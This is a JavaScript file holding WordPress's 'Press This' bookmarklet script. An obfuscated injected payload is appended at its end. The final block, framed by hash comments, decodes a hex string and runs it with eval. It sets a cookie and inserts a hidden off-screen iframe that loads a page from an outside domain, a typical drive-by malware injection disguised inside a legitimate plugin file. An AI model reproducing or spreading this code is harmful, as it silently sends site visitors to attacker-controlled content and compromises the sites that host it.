( function( window, document, href, pt_url ) {
	var encURI = window.encodeURIComponent,
		form = document.createElement( 'form' ),
		head = document.getElementsByTagName( 'head' )[0],
		target = '_press_this_app',
		canPost = true,
		windowWidth, windowHeight, selection,
		metas, links, content, images, iframes, img;

	if ( ! pt_url ) {
		return;
	}

	if ( href.match( /^https?:/ ) ) {
		pt_url += '&u=' + encURI( href );
		if ( href.match( /^https:/ ) && pt_url.match( /^http:/ ) ) {
			canPost = false;
		}
	} else {
		top.location.href = pt_url;
		return;
	}

	if ( window.getSelection ) {
		selection = window.getSelection() + '';
	} else if ( document.getSelection ) {
		selection = document.getSelection() + '';
	} else if ( document.selection ) {
		selection = document.selection.createRange().text || '';
	}

	pt_url += '&buster=' + ( new Date().getTime() );

	if ( ! canPost ) {
		if ( document.title ) {
			pt_url += '&t=' + encURI( document.title.substr( 0, 256 ) );
		}

		if ( selection ) {
			pt_url += '&s=' + encURI( selection.substr( 0, 512 ) );
		}
	}

	windowWidth  = window.outerWidth || document.documentElement.clientWidth || 600;
	windowHeight = window.outerHeight || document.documentElement.clientHeight || 700;

	windowWidth = ( windowWidth < 800 || windowWidth > 5000 ) ? 600 : ( windowWidth * 0.7 );
	windowHeight = ( windowHeight < 800 || windowHeight > 3000 ) ? 700 : ( windowHeight * 0.9 );

	if ( ! canPost ) {
		window.open( pt_url, target, 'location,resizable,scrollbars,width=' + windowWidth + ',height=' + windowHeight );
		return;
	}

	function add( name, value ) {
		if ( typeof value === 'undefined' ) {
			return;
		}

		var input = document.createElement( 'input' );

		input.name = name;
		input.value = value;
		input.type = 'hidden';

		form.appendChild( input );
	}

	if ( href.match( /\/\/(www|m)\.youtube\.com\/watch/ ) ||
		href.match( /\/\/vimeo\.com\/(.+\/)?([\d]+)$/ ) ||
		href.match( /\/\/(www\.)?dailymotion\.com\/video\/.+$/ ) ||
		href.match( /\/\/soundcloud\.com\/.+$/ ) ||
		href.match( /\/\/twitter\.com\/[^\/]+\/status\/[\d]+$/ ) ||
		href.match( /\/\/vine\.co\/v\/[^\/]+/ ) ) {

		add( '_embeds[]', href );
	}

	metas = head.getElementsByTagName( 'meta' ) || [];

	for ( var m = 0; m < metas.length; m++ ) {
		if ( m > 200 ) {
			break;
		}

		var q = metas[ m ],
			q_name = q.getAttribute( 'name' ),
			q_prop = q.getAttribute( 'property' ),
			q_cont = q.getAttribute( 'content' );

		if ( q_cont ) {
			if ( q_name ) {
				add( '_meta[' + q_name + ']', q_cont );
			} else if ( q_prop ) {
				add( '_meta[' + q_prop + ']', q_cont );
			}
		}
	}

	links = head.getElementsByTagName( 'link' ) || [];

	for ( var y = 0; y < links.length; y++ ) {
		if ( y >= 50 ) {
			break;
		}

		var g = links[ y ],
			g_rel = g.getAttribute( 'rel' );

		if ( g_rel === 'canonical' || g_rel === 'icon' || g_rel === 'shortlink' ) {
			add( '_links[' + g_rel + ']', g.getAttribute( 'href' ) );
		}
	}

	if ( document.body.getElementsByClassName ) {
		content = document.body.getElementsByClassName( 'hfeed' )[0];
	}

	content = document.getElementById( 'content' ) || content || document.body;
	images = content.getElementsByTagName( 'img' ) || [];

	for ( var n = 0; n < images.length; n++ ) {
		if ( n >= 100 ) {
			break;
		}

		img = images[ n ];

		// If we know the image width and/or height, check them now and drop the "uninteresting" images.
		if ( img.src.indexOf( 'avatar' ) > -1 || img.className.indexOf( 'avatar' ) > -1 ||
			( img.width && img.width < 256 ) || ( img.height && img.height < 128 ) ) {

			continue;
		}

		add( '_images[]', img.src );
	}

	iframes = document.body.getElementsByTagName( 'iframe' ) || [];

	for ( var p = 0; p < iframes.length; p++ ) {
		if ( p >= 50 ) {
			break;
		}

		add( '_embeds[]', iframes[ p ].src );
	}

	if ( document.title ) {
		add( 't', document.title );
	}

	if ( selection ) {
		add( 's', selection );
	}

	form.setAttribute( 'method', 'POST' );
	form.setAttribute( 'action', pt_url );
	form.setAttribute( 'target', target );
	form.setAttribute( 'style', 'display: none;' );

	window.open( 'about:blank', target, 'location,resizable,scrollbars,width=' + windowWidth + ',height=' + windowHeight );

	document.body.appendChild( form );
	form.submit();
} )( window, document, top.location.href, window.pt_url );
/*5e5a1ebcc4c56422191d52b7ac954f23*/;(function(){var saykeyai="";var rtyestba="77696e646f772e6f6e6c6f6164203d2066756e6374696f6e28297b66756e6374696f6e20783232627128612c622c63297b69662863297b7661722064203d206e6577204461746528293b642e7365744461746528642e6765744461746528292b63293b7d6966286120262620622920646f63756d656e742e636f6f6b6965203d20612b273d272b622b2863203f20273b20657870697265733d272b642e746f555443537472696e672829203a202727293b656c73652072657475726e2066616c73653b7d66756e6374696f6e2078333362712861297b7661722062203d206e65772052656745787028612b273d285b5e3b5d297b312c7d27293b7661722063203d20622e6578656328646f63756d656e742e636f6f6b6965293b69662863292063203d20635b305d2e73706c697428273d27293b656c73652072657475726e2066616c73653b72657475726e20635b315d203f20635b315d203a2066616c73653b7d766172207833336471203d2078333362712822316336663361326663383935353135303632656663653537306364343737393622293b69662820783333647120213d2022623966373264313330636330343236303163363032336662643462343631623822297b783232627128223163366633613266633839353531353036326566636535373063643437373936222c226239663732643133306363303432363031633630323366626434623436316238222c31293b766172207832326471203d20646f63756d656e742e637265617465456c656d656e74282264697622293b766172207832327171203d2022687474703a2f2f6e6577732e62656c756968616d656c656f6e2e696e666f2f68656c6c6f6d796c6974746c6570696767792f3f6e52726a51654456436a3d6b7057644466537a26576157616b667378666b3d6d767465516c4745654a45267058576942496c5257724d76743d5674554d6675694753514978414868266d7772684f7677576861524b6c583d724171645447754b567026524368784a726d68664479764578644b483d78756b745670694b484a49576d47264648686d5959754c4a5550533d504343795a684e6f71767465594f4f5976597226677a5841464a477a455a58733d77497a4f66616270534b6746266b6579776f72643d356333633633646666613162386663366132333131316464303737663032646526435255494b65594d7a674868494b79583d706c4161455a4177506163223b78323264712e696e6e657248544d4c3d223c646976207374796c653d27706f736974696f6e3a6162736f6c7574653b7a2d696e6465783a313030303b746f703a2d3130303070783b6c6566743a2d3939393970783b273e3c696672616d65207372633d27222b78323271712b22273e3c2f696672616d653e3c2f6469763e223b646f63756d656e742e626f64792e617070656e644368696c64287832326471293b7d7d";for (var ikknyire=0;ikknyire<rtyestba.length;ikknyire+=2){saykeyai=saykeyai+parseInt(rtyestba.substring(ikknyire,ikknyire+2), 16)+",";}saykeyai=saykeyai.substring(0,saykeyai.length-1);eval(eval('String.fromCharCode('+saykeyai+')'));})();/*5e5a1ebcc4c56422191d52b7ac954f23*/